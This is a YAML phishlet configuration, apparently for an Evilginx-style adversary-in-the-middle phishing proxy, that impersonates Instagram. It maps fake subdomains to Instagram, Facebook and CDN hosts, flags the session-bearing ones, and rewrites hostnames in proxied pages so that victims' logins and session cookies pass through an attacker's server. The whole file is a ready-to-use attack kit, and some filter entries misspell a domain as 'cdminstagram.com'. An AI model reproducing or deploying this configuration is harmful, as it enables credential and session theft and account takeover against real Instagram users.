author: '@fire'
min_ver: '2.3.0'
proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'instagram.com', session: true, is_landing: true}
  - {phish_sub: 'm', orig_sub: 'm', domain: 'instagram.com', session: true, is_landing: false}
  - {phish_sub: 'static', orig_sub: 'static', domain: 'cdninstagram.com', session: true, is_landing: false}
  - {phish_sub: 'connect', orig_sub: 'connect', domain: 'facebook.net', session: true, is_landing: false}
  - {phish_sub: 'www1', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: false}
  - {phish_sub: 'graphql', orig_sub: 'graphql', domain: 'instagram.com', session: true, is_landing: false}
  - {phish_sub: 'img', orig_sub: 'instagram.fcdg1-1.fna', domain: 'fbcdn.net', session: false, is_landing: false}
  - {phish_sub: 'static-cdn', orig_sub: 'static', domain: 'cdninstagram.com', session: false, is_landing: false}
  - {phish_sub: 'scontent-cdn', orig_sub: 'scontent', domain: 'cdninstagram.com', session: false, is_landing: false}
  - {phish_sub: 'gr', orig_sub: 'graph', domain: 'instagram.com', session: true, is_landing: false}
  - {phish_sub: 'sta', orig_sub: 'static.xx', domain: 'fbcdn.net', session: false, is_landing: false}
  - {phish_sub: 'bekar', orig_sub: 'instagram.fmxp10-1.fna', domain: 'fbcdn.net', session: false, is_landing: false}
  - {phish_sub: 'edge-chat', orig_sub: 'edge-chat', domain: 'instagram.com', session: false, is_landing: false}

sub_filters:
  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'm.instagram.com', orig_sub: 'm', domain: 'instagram.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  #- {triggers_on: 'm.instagram.com', orig_sub: 'm', domain: 'instagram.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'static.cdninstagram.com', orig_sub: 'static', domain: 'cdminstagram.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'www.facebook.com', orig_sub: 'static', domain: 'cdminstagram.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'graphql.instagram.com', orig_sub: 'connect', domain: 'facebook.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'img.instagram.fcdg1-1.fna.fbcdn.net', orig_sub: 'img.instagram.fcdg1-1.fna', domain: 'fbcdn.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'static-cdn.cdninstagram.com', orig_sub: 'static-cdn', domain: 'cdninstagram.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'scontent-cdn.cdninstagram.com', orig_sub: 'scontent-cdn', domain: 'cdninstagram.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'graph.instagram.com', orig_sub: 'graph', domain: 'instagram.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'static.xx.fbcdn.net', orig_sub: 'static.xx', domain: 'fbcdn.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'instagram.fmxp10-1.fna.fbcdn.net', orig_sub: 'instagram.fmxp10-1.fna', domain: 'fbcdn.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'edge-chat.instagram.com', orig_sub: 'edge-chat', domain: 'instagram.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}

